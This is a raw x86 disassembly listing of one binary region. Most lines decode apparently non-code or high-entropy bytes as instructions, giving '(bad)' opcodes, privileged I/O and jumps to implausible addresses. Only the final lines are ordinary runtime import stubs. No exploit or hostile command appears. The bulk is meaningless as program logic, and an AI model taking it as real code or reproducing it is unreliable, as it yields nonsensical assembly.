  41ff7c:	xchg   ebp,eax
  41ff7d:	xchg   BYTE PTR [ebx],bh
  41ff7f:	push   ebp
  41ff80:	pop    es
  41ff81:	dec    edx
  41ff82:	xor    eax,0xd5e96c85
  41ff87:	jae    0x41ff44
  41ff89:	cmp    dh,BYTE PTR [eax]
  41ff8b:	sub    edx,DWORD PTR [ecx]
  41ff8d:	addr16 adc eax,0xf900dde1
  41ff93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff94:	(bad)
  41ff97:	pushf  
  41ff98:	mul    BYTE PTR fs:0xbb635c0e
  41ff9f:	pusha  
  41ffa0:	xlat   BYTE PTR ds:[ebx]
  41ffa1:	mov    bh,0xd5
  41ffa3:	inc    edx
  41ffa4:	adc    DWORD PTR [eax],ebx
  41ffa6:	test   DWORD PTR [esi],eax
  41ffa8:	or     DWORD PTR [edx-0xe],edx
  41ffab:	shl    DWORD PTR [ecx-0x47cd6b33],cl
  41ffb1:	retf   
  41ffb2:	xor    ebx,DWORD PTR [ecx+0x57]
  41ffb5:	jle    0x41ffe6
  41ffb7:	jecxz  0x41ff95
  41ffb9:	jne    0x41ffcc
  41ffbb:	fimul  WORD PTR [edx+0x4f8cc8dc]
  41ffc1:	dec    ebp
  41ffc2:	xor    eax,0xc84f3024
  41ffc7:	sub    edx,DWORD PTR [eax]
  41ffc9:	fst    st(1)
  41ffcb:	das    
  41ffcc:	pushf  
  41ffcd:	push   cs
  41ffce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffcf:	mov    eax,ds:0x800b9be6
  41ffd4:	(bad)  
  41ffd5:	call   0xc5850e6d
  41ffda:	inc    ebp
  41ffdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffdc:	jmp    0x8ed82a01
  41ffe1:	mov    ebx,DWORD PTR [ecx+0x3]
  41ffe4:	je     0x41fff6
  41ffe6:	(bad)  
  41ffe7:	stc    
  41ffe8:	cmp    DWORD PTR [eax-0x1b],ebp
  41ffeb:	cs addr16 mov cl,0x72
  41ffef:	mov    DWORD PTR [edi-0x6e1dc9f0],ebx
  41fff5:	jae    0x420052
  41fff7:	sbb    ebp,DWORD PTR [eax+0x10]
  41fffa:	fcom   QWORD PTR [ebp-0xf7b1a4d]
  420000:	(bad)  
  420001:	sbb    cl,BYTE PTR [ebx]
  420003:	pusha  
  420004:	arpl   WORD PTR [esi+0x5d],bx
  420007:	sub    al,0x13
  420009:	jl     0x42001c
  42000b:	and    al,0x88
  42000d:	retf   0x9079
  420010:	adc    dl,dl
  420012:	ins    DWORD PTR es:[edi],dx
  420013:	adc    edi,DWORD PTR [ebx-0x165ecfe6]
  420019:	and    BYTE PTR [esi],bh
  42001b:	xchg   esi,eax
  42001c:	scas   al,BYTE PTR es:[edi]
  42001d:	mov    ds:0x1eb8032d,eax
  420022:	inc    esi
  420023:	mov    al,0x34
  420025:	shr    BYTE PTR [ebp+0x13],cl
  420028:	mov    ebx,0xe9a1301a
  42002d:	and    BYTE PTR [esi],bh
  42002f:	cmp    DWORD PTR [edx+edx*1],esp
  420032:	out    0xdf,al
  420034:	leave  
  420035:	inc    ebx
  420036:	in     al,dx
  420037:	rcl    DWORD PTR [edx-0x48],0x7c
  42003b:	jnp    0x41fff8
  42003d:	push   edx
  42003e:	xor    BYTE PTR [ecx-0x6979aaea],dh
  420044:	mov    ?,WORD PTR [ebx+0x59]
  420047:	sub    edx,DWORD PTR [eax+edx*1-0xd]
  42004b:	cmp    eax,0x74b0edb1
  420050:	or     al,0x70
  420052:	ss lock xchg edi,eax
  420055:	xchg   edi,eax
  420056:	cs imul ebx,ebx,0x981c5947
  42005d:	adc    DWORD PTR [eax+0x2bfe3d4d],eax
  420063:	xor    cl,dh
  420065:	int    0x69
  420067:	lock xchg ebp,eax
  420069:	lods   al,BYTE PTR ds:[esi]
  42006a:	xlat   BYTE PTR ds:[ebx]
  42006b:	sbb    al,0xd1
  42006d:	int3   
  42006e:	lahf   
  42006f:	mov    esi,0xee8ad907
  420074:	repnz push ebx
  420076:	popa   
  420077:	lock stc 
  420079:	bound  esp,QWORD PTR ss:[edx]
  42007c:	aam    0x7d
  42007e:	pop    ebp
  42007f:	and    edx,edi
  420081:	sbb    eax,0xe6079ef9
  420086:	pop    esi
  420087:	dec    esi
  420088:	js     0x42003e
  42008a:	outs   dx,DWORD PTR ds:[esi]
  42008b:	sub    esp,0x68
  42008e:	pop    edx
  42008f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420090:	jle    0x4200e7
  420092:	(bad)  
  420093:	imul   ebx,ebx,0xd9a98516
  420099:	scas   eax,DWORD PTR es:[edi]
  42009a:	fcomp  QWORD PTR [edx+0x7878fab1]
  4200a0:	inc    dl
  4200a2:	mov    ebx,0xc61f9d51
  4200a7:	in     al,dx
  4200a8:	adc    dh,BYTE PTR [ebx]
  4200aa:	fcmovnu st,st(4)
  4200ac:	mov    dl,BYTE PTR [ebx]
  4200ae:	add    DWORD PTR [ebx-0x73e60e83],0xf818f838
  4200b8:	pop    edi
  4200b9:	and    BYTE PTR [edx-0x1e],bh
  4200bc:	sahf   
  4200bd:	fwait
  4200be:	pop    ecx
  4200bf:	fimul  WORD PTR [ebx+ebx*4]
  4200c2:	xchg   ch,al
  4200c4:	or     DWORD PTR [edx-0x1b],ebp
  4200c7:	jmp    0x420104
  4200c9:	cmp    dh,BYTE PTR [eax]
  4200cb:	mov    eax,ds:0xa953949d
  4200d0:	aam    0xc3
  4200d2:	dec    ebx
  4200d3:	push   esi
  4200d4:	mov    WORD PTR [ebx+0x33e28085],ds
  4200da:	xchg   esp,eax
  4200db:	lock cld 
  4200dd:	ss xor esp,esp
  4200e0:	into   
  4200e1:	add    eax,0xcc9f3c29
  4200e6:	or     bl,ch
  4200e8:	retf   
  4200e9:	mov    eax,DWORD PTR [ebp+0x2931e280]
  4200ef:	scas   eax,DWORD PTR es:[edi]
  4200f0:	xor    dl,cl
  4200f2:	mov    ebx,0x531512e6
  4200f7:	test   eax,0x515968ae
  4200fc:	(bad)  
  4200fd:	ficomp WORD PTR [esi+0x4e]
  420100:	retf   0x6a33
  420103:	sar    BYTE PTR [ebx+0x6251303a],cl
  420109:	push   edx
  42010a:	repz xchg esi,eax
  42010c:	and    al,0x47
  42010e:	sar    BYTE PTR [ebp+0x1dc39889],cl
  420114:	jp     0x42010e
  420116:	cmp    al,0x28
  420118:	inc    esp
  420119:	outs   dx,DWORD PTR ds:[esi]
  42011a:	jo     0x420146
  42011c:	(bad)  
  42011e:	xchg   ebx,eax
  42011f:	mov    ebp,0x97e94750
  420124:	clc    
  420125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420126:	cmpxchg dh,ch
  420129:	xor    ebp,DWORD PTR [edx-0x2]
  42012c:	jnp    0x42017c
  42012e:	add    ecx,DWORD PTR [eax]
  420130:	push   ss
  420131:	push   ebp
  420132:	(bad)  
  420133:	cdq    
  420134:	scas   eax,DWORD PTR es:[edi]
  420135:	inc    eax
  420136:	imul   DWORD PTR [ecx+0x2e869b73]
  42013c:	aas    
  42013d:	mov    ebx,0x7afba329
  420142:	pusha  
  420143:	bnd jmp 0xde229749
  420149:	pop    ss
  42014a:	pop    ecx
  42014b:	adc    DWORD PTR [eax+ebx*4+0x70b11dc3],ebx
  420152:	out    0xbd,eax
  420154:	nop
  420155:	jg     0x42013b
  420157:	mov    ds:0x615f0cd7,al
  42015c:	popf   
  42015d:	add    DWORD PTR [eax+edx*1+0x4dbb6f67],edx
  420164:	xchg   ebp,eax
  420165:	xchg   ecx,eax
  420166:	and    ah,al
  420168:	sahf   
  420169:	mov    bl,0x59
  42016b:	or     eax,DWORD PTR [eax+edx*1+0x336ac1c5]
  420172:	aas    
  420173:	pop    ebx
  420174:	xor    BYTE PTR [eax+0x20],bh
  420177:	icebp  
  420178:	popf   
  420179:	pop    ss
  42017a:	ficom  WORD PTR [esi-0x516831f5]
  420180:	pop    es
  420181:	ror    BYTE PTR [edx+0x2db4d304],1
  420187:	mov    edx,0x6103365a
  42018c:	jl     0x4201a3
  42018e:	mov    esi,0xd247cb69
  420193:	pop    es
  420194:	fcom   QWORD PTR [eax]
  420196:	ret    
  420197:	cmp    eax,0xbbe968c5
  42019c:	iret   
  42019d:	add    eax,0xdeeae4b9
  4201a2:	stos   DWORD PTR es:[edi],eax
  4201a3:	xchg   ebp,eax
  4201a4:	push   eax
  4201a5:	adc    al,0xc6
  4201a7:	add    eax,0x4e96c007
  4201ac:	or     DWORD PTR [edi-0x3cc78e25],esi
  4201b2:	xor    ch,dl
  4201b4:	sbb    al,0x16
  4201b6:	xchg   ebp,eax
  4201b7:	sub    bl,BYTE PTR [eax+0x28a59005]
  4201bd:	jo     0x420229
  4201bf:	sahf   
  4201c0:	mov    cl,0xc5
  4201c2:	nop
  4201c3:	lock enter 0xbb22,0xe2
  4201c8:	or     bl,dh
  4201ca:	popf   
  4201cb:	gs push eax
  4201cd:	adc    al,0xda
  4201cf:	test   eax,0xe5cd105e
  4201d4:	mov    cl,0xfd
  4201d6:	nop
  4201d7:	js     0x4201d7
  4201d9:	into   
  4201da:	popa   
  4201db:	pop    esi
  4201dc:	(bad)  
  4201dd:	fidiv  WORD PTR [ebx]
  4201df:	xor    al,0x18
  4201e1:	pop    esp
  4201e2:	add    eax,0x6b332e02
  4201e7:	(bad)  
  4201e8:	jnp    0x42021f
  4201ea:	mov    ch,0xcd
  4201ec:	jmp    0x9f242b9b
  4201f1:	lahf   
  4201f2:	jmp    0xdf316a0a
  4201f7:	xchg   ebp,eax
  4201f8:	mov    cl,0xed
  4201fa:	mov    BYTE PTR [eax+0x79],dl
  4201fd:	mov    cl,0xe8
  4201ff:	sti    
  420200:	popf   
  420201:	adc    BYTE PTR [edx],cl
  420203:	loop   0x420258
  420205:	jecxz  0x4201d9
  420207:	push   esi
  420208:	mov    WORD PTR [eax],ss
  42020a:	push   es
  42020b:	cmp    bh,BYTE PTR gs:[eax-0x4e868794]
  420212:	shr    BYTE PTR [edx],0x50
  420215:	push   ecx
  420216:	std    
  420217:	mov    eax,ds:0x5e3ac48a
  42021c:	pop    ebp
  42021d:	jae    0x42022c
  42021f:	or     eax,0x6e7beb1
  420224:	arpl   WORD PTR [ecx],di
  420226:	enter  0xd022,0x5d
  42022a:	(bad)  
  42022c:	fst    QWORD PTR [eax]
  42022e:	xor    BYTE PTR [eax],0xa9
  420231:	fs mov esi,eax
  420234:	ret    0xade0
  420237:	xchg   ebx,eax
  420238:	mov    bh,0xb9
  42023a:	enter  0x63a2,0x53
  42023e:	pop    ebp
  42023f:	outs   dx,BYTE PTR ds:[esi]
  420240:	fadd   DWORD PTR [ebx+ebx*2-0x3f222caf]
  420247:	mov    WORD PTR [edi+0x58],cs
  42024a:	xor    eax,0xf44f72fe
  42024f:	sub    al,0x63
  420251:	mov    ecx,0x2fd90380
  420256:	rol    BYTE PTR [esi-0x74],cl
  420259:	fwait
  42025a:	jns    0x42020c
  42025c:	loop   0x4202a5
  42025e:	cmp    DWORD PTR [ebx+0x30],ecx
  420261:	jg     0x42024f
  420263:	scas   al,BYTE PTR es:[edi]
  420264:	mov    eax,ds:0x6c66d01d
  420269:	aas    
  42026a:	(bad)  
  42026b:	aad    0x4c
  42026d:	add    DWORD PTR [ebp-0x6ac494c3],0x7a
  420274:	into   
  420275:	aas    
  420276:	mov    ebx,0xd5befee4
  42027b:	loop   0x420219
  42027d:	jae    0x4202d8
  42027f:	or     DWORD PTR [eax-0x15b1ba50],eax
  420285:	mov    ebx,0xf388a331
  42028a:	mov    ebx,0x368432e6
  42028f:	mov    eax,0x8732960a
  420294:	pop    ebp
  420295:	dec    edx
  420296:	data16 mov dh,0x39
  420299:	cmp    esp,DWORD PTR [ebp+0x70fa887f]
  42029f:	jb     0x420297
  4202a1:	add    eax,DWORD PTR [esi-0x784777c5]
  4202a7:	data16 aad 0x18
  4202aa:	inc    ecx
  4202ab:	in     eax,dx
  4202ac:	jae    0x42027b
  4202ae:	lods   eax,DWORD PTR ds:[esi]
  4202af:	adc    edi,DWORD PTR [ebx+0x47a130ba]
  4202b5:	stos   BYTE PTR es:[edi],al
  4202b6:	mov    ds:0xfe122495,eax
  4202bb:	(bad)  
  4202bd:	inc    ebx
  4202be:	mov    ebp,0x74ccde80
  4202c3:	lock jae 0x420324
  4202c6:	xchg   ecx,eax
  4202c7:	xchg   ecx,eax
  4202c8:	push   ss
  4202c9:	push   ebp
  4202ca:	(bad)  
  4202cb:	loop   0x4202f0
  4202cd:	into   
  4202ce:	popf   
  4202cf:	pop    esi
  4202d0:	pop    es
  4202d1:	fmul   QWORD PTR [edx-0x1a4b85b2]
  4202d7:	xor    esp,DWORD PTR [ebx+0x53a2f1b1]
  4202dd:	mov    ch,0x5d
  4202df:	or     al,0xc7
  4202e1:	int3   
  4202e2:	ds aad 0x49
  4202e5:	xchg   ebx,eax
  4202e6:	jns    0x42030d
  4202e8:	addr16 jnp 0x420324
  4202eb:	sub    al,0xed
  4202ed:	imul   esp,DWORD PTR [ecx-0xd],0x95dab995
  4202f4:	push   eax
  4202f5:	xor    esi,esi
  4202f7:	jle    0x420300
  4202f9:	out    0xa2,eax
  4202fb:	cmc    
  4202fc:	xchg   DWORD PTR [ebx+0xbbb7b6c],edi
  420302:	lock nop
  420304:	int    0xf9
  420306:	jmp    0xb047:0xfe64ad78
  42030d:	lahf   
  42030e:	cmc    
  42030f:	in     eax,dx
  420310:	mov    bl,0x79
  420312:	xchg   DWORD PTR [ebx-0x42],eax
  420315:	lds    esi,FWORD PTR [eax]
  420317:	mov    eax,ds:0x2fc8df16
  42031c:	rcr    DWORD PTR [esi+eiz*4-0x6120fe5e],cl
  420323:	xlat   BYTE PTR ds:[ebx]
  420324:	shr    DWORD PTR [edx+0x3a9d0fe1],1
  42032a:	mov    edx,0xc66950a7
  42032f:	sbb    dl,BYTE PTR [edx+0x6822124f]
  420335:	sbb    BYTE PTR [esi-0x3a],al
  420338:	mov    bl,0x79
  42033a:	lods   eax,DWORD PTR ds:[esi]
  42033b:	xchg   ebx,eax
  42033c:	mov    ecx,0x2ad91b
  420341:	(bad)  
  420342:	adc    BYTE PTR [ebp+0x52],ch
  420345:	push   eax
  420346:	push   ecx
  420347:	xchg   ecx,eax
  420348:	mov    bl,dl
  42034a:	repz ss leave 
  42034d:	sbb    al,0xe6
  42034f:	jge    0x42034e
  420351:	push   es
  420352:	and    dl,dl
  420354:	xor    edx,DWORD PTR [esi+edi*1+0x5f59516b]
  42035b:	shl    DWORD PTR [ebx+0x6c],0x79
  42035f:	cmp    dh,BYTE PTR [edi-0x6dc20b44]
  420365:	clc    
  420366:	mov    edx,0x5c529ea3
  42036b:	sub    ebx,edx
  42036d:	iret   
  42036e:	xchg   ebp,eax
  42036f:	push   edi
  420370:	push   es
  420371:	fld    DWORD PTR [ebp+ecx*2-0x6b924583]
  420378:	push   eax
  420379:	dec    ebp
  42037a:	or     al,0xe1
  42037c:	fs popa 
  42037e:	pop    edi
  42037f:	test   al,0x1a
  420381:	scas   eax,DWORD PTR es:[edi]
  420382:	rcr    bl,1
  420384:	(bad)  [ebp+eax*1+0x25]
  420388:	cmp    eax,0x52ba7232
  42038d:	aas    
  42038e:	mov    ebp,0xff13cea5
  420393:	stos   DWORD PTR es:[edi],eax
  420394:	call   0xf170:0xbb253a7e
  42039b:	rol    ch,0xb8
  42039e:	ins    BYTE PTR es:[edi],dx
  42039f:	jnp    0x4203d2
  4203a1:	and    al,0x76
  4203a3:	test   eax,0xe42221cd
  4203a8:	xchg   edi,eax
  4203a9:	pop    edi
  4203aa:	repz addr16 dec esp
  4203ad:	jo     0x420338
  4203af:	dec    eax
  4203b0:	dec    esp
  4203b1:	mov    eax,0x46c95b50
  4203b6:	mov    bl,0x41
  4203b8:	or     DWORD PTR [ecx],esp
  4203ba:	xor    esp,esp
  4203bc:	xchg   ebx,eax
  4203bd:	inc    ebp
  4203be:	mov    ah,0xdd
  4203c0:	mov    dl,BYTE PTR [esi]
  4203c2:	sar    DWORD PTR [edx],1
  4203c4:	sti    
  4203c5:	push   eax
  4203c6:	outs   dx,BYTE PTR ds:[esi]
  4203c7:	clc    
  4203c8:	jge    0x420402
  4203ca:	sbb    DWORD PTR [ebx+0x2f],esp
  4203cd:	mov    ebp,0x8c522ba4
  4203d2:	adc    edi,DWORD PTR [ebp+0x4e97ef8e]
  4203d8:	cmp    BYTE PTR [ebx],bh
  4203da:	scas   al,BYTE PTR es:[edi]
  4203db:	jg     0x42040f
  4203dd:	cmp    eax,0x1e1266b3
  4203e2:	mov    ds:0xa6aefa9a,eax
  4203e7:	pop    edi
  4203e8:	push   es
  4203e9:	cdq    
  4203ea:	les    ecx,FWORD PTR [ebp+0x3d]
  4203ed:	jmp    DWORD PTR ds:0x76b04c0e
  4203f3:	pop    edi
  4203f4:	aaa    
  4203f5:	mov    ebp,0xb8f5edd9
  4203fa:	sub    eax,0xc09506a9
  4203ff:	dec    ebp
  420400:	xor    eax,0x4c0e24ff
  420405:	mov    al,0x36
  420407:	out    0xff,eax
  420409:	cmp    BYTE PTR [ecx],ch
  42040b:	xchg   esi,eax
  42040c:	and    al,0xd7
  42040e:	pop    edi
  42040f:	and    ch,BYTE PTR [edx-0x36ecfe65]
  420415:	sbb    al,0xe5
  420417:	lods   eax,DWORD PTR ds:[esi]
  420418:	push   eax
  420419:	in     eax,dx
  42041a:	mov    cl,0x60
  42041c:	jmp    0x51abda76
  420421:	pop    ecx
  420422:	xchg   esp,eax
  420423:	pop    esi
  420424:	push   edi
  420425:	out    dx,eax
  420426:	jne    0x420470
  420428:	jbe    0x4203dd
  42042a:	gs nop
  42042c:	mov    ds:0x30d5bdaa,al
  420431:	push   ebp
  420432:	jmp    0xf97:0x5b6ba979
  420439:	jnp    0x4203c9
  42043b:	add    al,0xda
  42043d:	mov    ch,0xef
  42043f:	call   0x57d7:0x22ed4ebc
  420446:	mov    al,0xe2
  420448:	ffree  st(4)
  42044a:	adc    al,0x54
  42044c:	add    DWORD PTR [esi+eax*4],ecx
  42044f:	add    eax,0x93ad47c5
  420454:	mov    ecx,0xd4881b4e
  420459:	mov    esp,0xb82496a4
  42045e:	pop    edi
  42045f:	and    ch,BYTE PTR [edx+0x382d479b]
  420465:	xor    dh,BYTE PTR [edx-0xa]
  420468:	in     al,dx
  420469:	lds    edi,FWORD PTR [ebp-0xec715b]
  42046f:	stos   DWORD PTR es:[edi],eax
  420470:	push   ecx
  420471:	inc    ebp
  420472:	pop    edx
  420473:	push   ecx
  420474:	push   es
  420475:	rol    DWORD PTR [edi-0x10469ab3],0xbc
  42047c:	mov    ecx,0xe95e5fd3
  420481:	stos   BYTE PTR es:[edi],al
  420482:	push   ebp
  420483:	nop
  420484:	fmul   DWORD PTR [eax+0x47]
  420487:	xchg   esi,eax
  420488:	pop    es
  420489:	iret   
  42048a:	mov    ds:0x48ec39ed,al
  42048f:	push   edi
  420490:	sub    ah,0x47
  420493:	xchg   DWORD PTR [eax+ecx*2-0x3],esp
  420497:	adc    eax,0x25977ff
  42049c:	test   al,0xaf
  42049e:	ud0    ecx,ebp
  4204a1:	pusha  
  4204a2:	out    dx,eax
  4204a3:	mov    edi,0xfa6960b7
  4204a8:	dec    eax
  4204a9:	or     cl,BYTE PTR [ebx-0x2db99c56]
  4204af:	push   esi
  4204b0:	mov    WORD PTR [eax+0x65],?
  4204b3:	jge    0x4204e7
  4204b5:	mov    eax,0xe6507b6c
  4204ba:	mov    BYTE PTR [ebp-0x7d29aaea],ah
  4204c0:	push   cs
  4204c1:	into   
  4204c2:	and    al,0xdb
  4204c4:	xor    BYTE PTR [esi+eax*4+0x39b83ac5],bh
  4204cb:	lock push edi
  4204cd:	mov    ecx,0x341b1dc
  4204d2:	test   edx,esp
  4204d4:	mov    cs,WORD PTR [edi+0x59]
  4204d7:	adc    eax,DWORD PTR [eax+0x708f5698]
  4204dd:	mov    bh,0xdb
  4204df:	jns    0x420513
  4204e1:	jg     0x4204af
  4204e3:	sub    bl,dh
  4204e5:	xchg   esp,eax
  4204e6:	ss imul esi,eax,0xffffff97
  4204ea:	pop    ebx
  4204eb:	add    edi,DWORD PTR [ecx+ecx*8-0x29]
  4204ef:	idiv   dl
  4204f1:	xor    esi,DWORD PTR [eax+esi*8-0x46270447]
  4204f8:	sub    eax,0x506ba096
  4204fd:	lahf   
  4204fe:	nop
  4204ff:	adc    al,0xce
  420501:	fxch   st(7)
  420503:	mov    al,0xd4
  420505:	loope  0x4204ee
  420507:	mov    eax,0x5575b3fb
  42050c:	loope  0x4204c2
  42050e:	pop    ebp
  42050f:	sub    al,0xd3
  420511:	inc    esp
  420512:	xchg   edi,eax
  420513:	pop    edx
  420514:	(bad)  
  420515:	adc    al,bl
  420517:	cmp    eax,0x26e748b1
  42051c:	dec    edi
  42051d:	mov    cl,0x4d
  42051f:	test   eax,0x6b5d0347
  420524:	mov    eax,DWORD PTR [esi-0x62fbb1c6]
  42052a:	ror    BYTE PTR [esi-0xe],0xe0
  42052e:	dec    ecx
  42052f:	test   BYTE PTR [ebp+eax*8+0x30],al
  420533:	mov    ds:0xe1d1dfee,al
  420538:	fld    QWORD PTR [eax]
  42053a:	xchg   esp,eax
  42053b:	pop    ds
  42053c:	stc    
  42053d:	ins    BYTE PTR es:[edi],dx
  42053e:	fadd   st,st(6)
  420540:	leave  
  420541:	cli    
  420542:	cs cmp ecx,edi
  420545:	arpl   WORD PTR [ecx-0x2c],di
  420548:	ret    0xa3de
  42054b:	popa   
  42054c:	push   eax
  42054d:	cmp    al,dl
  42054f:	add    bl,bl
  420551:	adc    bl,bh
  420553:	cmp    eax,0xf090f5b1
  420558:	out    dx,al
  420559:	into   
  42055a:	popa   
  42055b:	test   DWORD PTR [ecx+0x66],0xd4e31f
  420562:	and    eax,esi
  420564:	sar    esp,cl
  420566:	gs jmp 0x81b1e6d0
  42056c:	repnz dec edi
  42056e:	(bad)  
  420570:	dec    eax
  420571:	ficom  WORD PTR [edi]
  420573:	in     al,dx
  420574:	sbb    esi,DWORD PTR [ebx]
  420576:	(bad)  
  420577:	push   ebp
  420578:	jl     0x4205ea
  42057a:	or     BYTE PTR [edi+0x3c],0x30
  42057e:	imul   edi,DWORD PTR [edi*8+0x2d5175b1],0xffffffa5
  420586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420587:	scas   al,BYTE PTR es:[edi]
  420588:	push   eax
  420589:	cmp    cl,0x13
  42058c:	pushf  
  42058d:	rcr    al,0x9a
  420590:	repz jp 0x4205f3
  420593:	jnp    0x420578
  420595:	bound  edi,QWORD PTR [edx-0x337f0252]
  42059b:	int3   
  42059c:	int3   
  42059d:	int3   
  42059e:	int3   
  42059f:	int3   
  4205a0:	jmp    DWORD PTR ds:0x421028
  4205a6:	push   0x30000
  4205ab:	push   0x10000
  4205b0:	call   0x4205c6
  4205b5:	pop    ecx
  4205b6:	pop    ecx
  4205b7:	ret    
  4205b8:	xor    eax,eax
  4205ba:	ret    
  4205bb:	int3   
  4205bc:	int3   
  4205bd:	int3   
  4205be:	int3   
  4205bf:	int3   
  4205c0:	jmp    DWORD PTR ds:0x421050
  4205c6:	jmp    DWORD PTR ds:0x421054
